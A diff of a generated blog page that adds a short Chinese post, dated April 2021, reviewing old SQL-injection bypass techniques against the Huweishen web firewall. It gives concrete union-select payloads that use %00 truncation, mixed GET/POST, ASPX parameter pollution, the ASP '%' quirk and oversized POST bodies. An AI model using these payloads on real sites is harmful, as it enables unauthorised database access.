@@ -17,9 +17,25 @@
   <meta name="description" content="">
   <meta name="author" content="pn1o">
   <meta name="keywords" content="">
-  <title>Archives - pn1o&#39;s blog</title>
+  <title>一些老的SQL注入绕过方法总结 - pn1o&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
 
 
 
@@ -47,7 +63,7 @@
 
 
 <body>
-  <header style="height: 60vh;">
+  <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -146,9 +162,46 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Archive">
+            <span class="h2" id="subtitle" title="一些老的SQL注入绕过方法总结">
               
             </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-04-11 11:46" pubdate>
+        April 11, 2021 am
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      264 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      3
+       分钟
+    </span>
+  
+
+  
+  
+</div>
 
             
           </div>
@@ -161,40 +214,87 @@
 
   <main>
     
-      <div class="container nopadding-x-md">
-        <div class="py-5" id="board"
-          >
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
-                
-
-<div class="list-group">
-  <p class="h4">2 posts in total.</p>
-  <hr>
-  
-  
-    
       
-      <p class="h5">2020</p>
-    
-    <a href="/2020/07/05/hello/" class="list-group-item list-group-item-action">
-      <span class="archive-post-title">hello</span>
-      <time style="float: right;">07-05</time>
-    </a>
-  
-</div>
 
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">一些老的SQL注入绕过方法总结</h1>
+            
+            <div class="markdown-body">
+              <p>#前言<br>高中后技术没怎么进步，甚至开始忘了以前学过的东西，趁着高三前这段时间再复习一下。<br>#护卫神SQL注入<br>##绕过姿势一： %00截断<br>APSX+Mssql中，%00来代替空白字符</p>
+<blockquote>
+<p>id=1%00and 1=2 union select 1,2,column_name from information_schema.columns</p>
+</blockquote>
+<p>##绕过姿势二： GET+POST<br>同时提交GET和POST请求，进入POST逻辑而忽略了GET<br>IIS+ASP/ASPX+Mssql/IIS+PHP+Mysql均适用</p>
+<blockquote>
+<p>id=1 and 1=2 union select 1,column_name,3 from information_schema.columns<br>POST:aaa</p>
+</blockquote>
+<p>##绕过姿势四：ASPX+HPP<br>在ASPX中，当GET/POST/COOKIE同时提交参数id，服务端接受参数id的顺序，GET,POST,COOKIE,中间通过逗号连接</p>
+<p>##绕过姿势五： ASP%特性<br>当我们输入un%ion的时候，解释会去掉%号，服务端接受的参数是union</p>
+<blockquote>
+<p>id=1 and 1=2 un%ion select 1,2,column_name from information_schema.columns</p>
+</blockquote>
+<p>##绕过姿势六：缓冲区溢出</p>
+<blockquote>
+<p>id=1 and 1=2 union /*<br>POST:<em>/select 1,column_name,3 from information_schema.columns<br>*PHP+Mysql中，使用POST大包溢出可成功bypass</em><br>test.php<br>POST: id=1 (select 1)=(select 0xA*100) union select 1,2.table_name from information_schema.tables</p>
+</blockquote>
 
-
-
-
-              </div>
             </div>
-          </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章未经允许禁止转载！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/07/05/hello/">
+                        <span class="hidden-mobile">hello</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
         </div>
       </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
     
 
     
@@ -274,9 +374,15 @@
 
 
 
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
 
 
 
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
 
 
 
